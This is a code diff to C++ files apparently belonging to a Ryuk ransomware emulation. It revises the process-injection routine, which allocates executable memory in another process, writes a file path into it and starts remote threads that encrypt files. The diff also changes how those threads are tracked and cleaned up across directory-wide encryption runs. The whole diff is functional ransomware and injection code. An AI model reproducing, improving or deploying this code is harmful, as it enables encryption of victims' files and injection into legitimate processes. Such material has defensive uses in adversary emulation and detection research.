@@ -1,0 +1,231 @@
+diff --git a/Resources/Ryuk/ryuk/file_encryption.cc b/Resources/Ryuk/ryuk/file_encryption.cc
+index 8a55c17..28ff9b2 100644
+--- a/Resources/Ryuk/ryuk/file_encryption.cc
++++ b/Resources/Ryuk/ryuk/file_encryption.cc
+@@ -273,7 +273,7 @@ namespace ryuk {
+         std::stack<std::wstring> directories;
+         std::wstring spec;
+         std::wstring fileOrDirectoryToEncrypt;
+-        std::vector<LPVOID> processExMemory;
++        std::map<HANDLE, LPVOID> processExMemory;
+ 
+         directories.push(path);
+         if (files != nullptr)
+@@ -377,32 +377,67 @@ namespace ryuk {
+             }
+         }
+ 
++        _ftprintf_s(stderr, TEXT("\n\t\tStarting cleanup for %zu threads...\n"), processExMemory.size());
++
+         // Finish clearing memory cleanup for injected process.
+         if (!processExMemory.empty())
+         {
+             HANDLE hTargetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwInjectedProcessPID);
++            DWORD dwExitCode = 0L;
+ 
+             if (hTargetProcessHandle)
+             {
+-                for (std::vector<LPVOID>::iterator it = processExMemory.begin(); it != processExMemory.end(); ++it)
++                while (!processExMemory.empty())
+                 {
+-                    if (!VirtualFreeEx(hTargetProcessHandle, *it, 0L, MEM_RELEASE))
++                    Sleep(500);
++                    for (std::map<HANDLE, LPVOID>::iterator it = processExMemory.begin(); it != processExMemory.end(); )
+                     {
+-                        fprintf_s(stderr, "Error in VirtualFreeEx for argumentAddress...\n");
++                        if (GetExitCodeThread(it->first, &dwExitCode))
++                        {
++                            if (dwExitCode != STILL_ACTIVE)
++                            {
++                                // Exit code -14 means it tried to encrypt a file that was already encrypted.
++                                if ((dwExitCode != 0L) && (dwExitCode != -14L))
++                                {
++                                    _ftprintf_s(stderr, TEXT("EncryptionThread exited with status code %ld\n"), dwExitCode);
++                                }
++                                if (!VirtualFreeEx(hTargetProcessHandle, it->second, 0L, MEM_RELEASE))
++                                {
++                                    _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::processExMemory::VirtualFreeEx for argumentAddress %u...\n"), GetLastError());
++                                }
++                                if (!CloseHandle(it->first))
++                                {
++                                    _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::processExMemory::CloseHandle for hTargetProcessHandle %u...\n"), GetLastError());
++                                }
++                                it = processExMemory.erase(it);
++                            }
++                            else
++                            {
++                                it++;
++                            }
++                        }
++                        else
++                        {
++                            _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::GetExitCodeThread %u...\n"), GetLastError());
++                            it++;
++                        }
+                     }
++                    _ftprintf_s(stderr, TEXT("\t\tWaiting for %zu threads to finish...\n"), processExMemory.size());
+                 }
+ 
+                 if (!CloseHandle(hTargetProcessHandle))
+                 {
+-                    _ftprintf_s(stderr, TEXT("Error in CloseHandle for hTargetProcessHandle...\n"));
++                    _ftprintf_s(stderr, TEXT("Error in CloseHandle for hTargetProcessHandle %u...\n"), GetLastError());
+                 }
+-
+-                processExMemory.clear();
++            }
++            else
++            {
++                _ftprintf_s(stderr, TEXT("Error in OpenProcess for hTargetProcessHandle %u...\n"), GetLastError());
+             }
+         }
+ 
+         // To show the process is running
+-        _ftprintf_s(stdout, TEXT(".\n"));
++        _ftprintf_s(stdout, TEXT("Done encrypting this drive.\n"));
+ 
+         return TRUE;
+     }
+diff --git a/Resources/Ryuk/ryuk/file_encryption.h b/Resources/Ryuk/ryuk/file_encryption.h
+index 7fce4ba..c0d660e 100644
+--- a/Resources/Ryuk/ryuk/file_encryption.h
++++ b/Resources/Ryuk/ryuk/file_encryption.h
+@@ -2,6 +2,7 @@
+ #define RYUK_FILE_ENCRYPTION_H_
+ 
+ #include <cstdio>
++#include <map>
+ #include <stack>
+ #include <string>
+ #include <vector>
+diff --git a/Resources/Ryuk/ryuk/process_inject.cc b/Resources/Ryuk/ryuk/process_inject.cc
+index dea884e..25af4db 100644
+--- a/Resources/Ryuk/ryuk/process_inject.cc
++++ b/Resources/Ryuk/ryuk/process_inject.cc
+@@ -372,60 +372,87 @@ namespace ryuk {
+      *      iFileLen - Holds the length of tFileToEncrypt
+      *      EncryptionProcedureL - Function pointer to what we want to execute from the remote thread
+     */
+-    BOOL CreateEncryptionThread(DWORD dwTargetProcessPID, const TCHAR* tFileToEncrypt, const SIZE_T iFileLen, EncryptionProcedureFunc EncryptionProcedureL, std::vector<LPVOID>* processExMemory)
++    BOOL CreateEncryptionThread(DWORD dwTargetProcessPID, const TCHAR* tFileToEncrypt, const SIZE_T iFileLen, EncryptionProcedureFunc EncryptionProcedureL, std::map<HANDLE, LPVOID>* processExMemory)
+     {
+         HANDLE hTargetProcessHandle = INVALID_HANDLE_VALUE;
+         HANDLE hRemoteProcessHandle = INVALID_HANDLE_VALUE;
+         BOOL operationStatus = FALSE;
+         SIZE_T dwNumberOfBytesWritten = 0L;
+-        LPVOID argumentAddress = nullptr;
++        LPVOID lpArgumentAddress = nullptr;
++        DWORD dwExitCode = 0L;
+ 
+         hTargetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetProcessPID);
+ 
+         if (hTargetProcessHandle)
+         {
+-            argumentAddress = VirtualAllocEx(hTargetProcessHandle, 0, iFileLen * sizeof(TCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+-            if (argumentAddress)
++            lpArgumentAddress = VirtualAllocEx(hTargetProcessHandle, 0, iFileLen * sizeof(TCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
++            if (lpArgumentAddress)
+             {
+-                if (WriteProcessMemory(hTargetProcessHandle, argumentAddress, ((LPCVOID)tFileToEncrypt), iFileLen * sizeof(TCHAR), &dwNumberOfBytesWritten))
++                if (WriteProcessMemory(hTargetProcessHandle, lpArgumentAddress, ((LPCVOID)tFileToEncrypt), iFileLen * sizeof(TCHAR), &dwNumberOfBytesWritten))
+                 {
+-                    hRemoteProcessHandle = CreateRemoteThread(hTargetProcessHandle, nullptr, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)EncryptionProcedureL), argumentAddress, 0L, nullptr);
++                    hRemoteProcessHandle = CreateRemoteThread(hTargetProcessHandle, nullptr, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)EncryptionProcedureL), lpArgumentAddress, 0L, nullptr);
+                     if (hRemoteProcessHandle)
+                     {
+                         operationStatus = TRUE;
+-                        processExMemory->push_back(argumentAddress);
++                        processExMemory->insert(std::pair<HANDLE, LPVOID>(hRemoteProcessHandle, lpArgumentAddress));
+                     }
+                 }
+                 else
+                 {
+-                    _ftprintf_s(stderr, TEXT("Error in CreateThread::WriteProcessMemory for argumentAddress. Error %u\n"), GetLastError());
++                    _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::WriteProcessMemory for argumentAddress. Error %u\n"), GetLastError());
+ 
+-                    if (!VirtualFreeEx(hTargetProcessHandle, argumentAddress, 0L, MEM_RELEASE))
++                    if (!VirtualFreeEx(hTargetProcessHandle, lpArgumentAddress, 0L, MEM_RELEASE))
+                     {
+-                        _ftprintf_s(stderr, TEXT("Error in CreateThread::WriteProcessMemory::VirtualFreeEx for argumentAddress. Error %u\n"), GetLastError());
++                        _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::WriteProcessMemory::VirtualFreeEx for argumentAddress. Error %u\n"), GetLastError());
+                     }
+                 }
+             }
+             else
+             {
+-                _ftprintf_s(stderr, TEXT("Error in CreateThread::VirtualAllocEx for argumentAddress. Error %u\n"), GetLastError());
++                _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::VirtualAllocEx for argumentAddress. Error %u\n"), GetLastError());
+             }
+ 
+             // In order to not bloat the injected process memory, every 10K files we will free up that memory.
+             if (processExMemory->size() >= 10000)
+             {
+                 _ftprintf_s(stdout, TEXT("."));
+-                Sleep(500);
+             
+-                for (std::vector<LPVOID>::iterator it = processExMemory->begin(); it != processExMemory->end(); ++it)
++                while (!processExMemory->empty())
+                 {
+-                    if (!VirtualFreeEx(hTargetProcessHandle, *it, 0L, MEM_RELEASE))
++                    Sleep(500);
++                    for (std::map<HANDLE, LPVOID>::iterator it = processExMemory->begin(); it != processExMemory->end(); )
+                     {
+-                        _ftprintf_s(stderr, TEXT("Error in CreateThread::processExMemory::VirtualFreeEx for argumentAddress...\n"));
++                        if (GetExitCodeThread(it->first, &dwExitCode))
++                        {
++                            if (dwExitCode != STILL_ACTIVE)
++                            {
++                                // Exit code 0 success encrypt and -14 means it tried to encrypt a file that was already encrypted.
++                                if ((dwExitCode != 0L) && (dwExitCode != -14L))
++                                {
++                                    _ftprintf_s(stderr, TEXT("EncryptionThread exited with status code %ld\n"), dwExitCode);
++                                }
++                                if (!VirtualFreeEx(hTargetProcessHandle, it->second, 0L, MEM_RELEASE))
++                                {
++                                    _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::processExMemory::VirtualFreeEx for argumentAddress %u...\n"), GetLastError());
++                                }
++                                if (!CloseHandle(it->first))
++                                {
++                                    _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::processExMemory::CloseHandle for hTargetProcessHandle %u...\n"), GetLastError());
++                                }
++                                it = processExMemory->erase(it);
++                            }
++                            else
++                            {
++                                it++;
++                            }
++                        }
++                        else
++                        {
++                            _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::GetExitCodeThread %u...\n"), GetLastError());
++                            it++;
++                        }
+                     }
+                 }
+-            
+-                processExMemory->clear();
+             }
+ 
+             if (!CloseHandle(hTargetProcessHandle))
+diff --git a/Resources/Ryuk/ryuk/process_inject.h b/Resources/Ryuk/ryuk/process_inject.h
+index 1c96237..ca55712 100644
+--- a/Resources/Ryuk/ryuk/process_inject.h
++++ b/Resources/Ryuk/ryuk/process_inject.h
+@@ -2,7 +2,7 @@
+ #define RYUK_PROCESS_INJECT_H_
+ 
+ #include <cstdio>
+-#include <vector>
++#include <map>
+ 
+ #include <windows.h>
+ #include <tchar.h>
+@@ -21,7 +21,7 @@ namespace ryuk {
+ 
+     BOOL AttemptInjection(const ProcessInfo* info);
+ 
+-    BOOL CreateEncryptionThread(DWORD dwTargetProcessPID, const TCHAR* tFileToEncrypt, const SIZE_T iFileLen, EncryptionProcedureFunc EncryptionProcedureL, std::vector<LPVOID>* processExMemory);
++    BOOL CreateEncryptionThread(DWORD dwTargetProcessPID, const TCHAR* tFileToEncrypt, const SIZE_T iFileLen, EncryptionProcedureFunc EncryptionProcedureL, std::map<HANDLE, LPVOID>* processExMemory);
+ 
+ }// namespace ryuk
+ 
